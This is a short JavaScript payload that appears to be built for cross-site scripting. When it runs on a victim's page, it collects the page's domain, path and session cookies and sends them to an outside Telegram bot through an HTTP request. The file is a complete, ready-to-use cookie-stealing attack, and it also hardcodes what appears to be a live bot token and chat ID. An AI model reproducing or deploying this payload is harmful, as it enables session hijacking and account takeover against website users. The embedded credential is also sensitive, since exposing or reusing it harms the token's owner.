var tokenBot = '7043468421:AAELoNUXP7iQ2ShMBCC7zr6fbmJavy8yQP0'; // Your "tokenBot" Here
var chatId = '480631913'; // Your "chatId" Here
function telegramSend(tokenBot, chatId) {
	var textData = '<b>XSS+Alert+in+' + document['domain']+'</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-</b>%0d%0a<pre>' + document['location']['hostname'] + document['location']['pathname'] + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document['cookie'] + '</pre>';
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=markdown', true);
    xhr.send();
}
telegramSend(tokenBot, chatId)
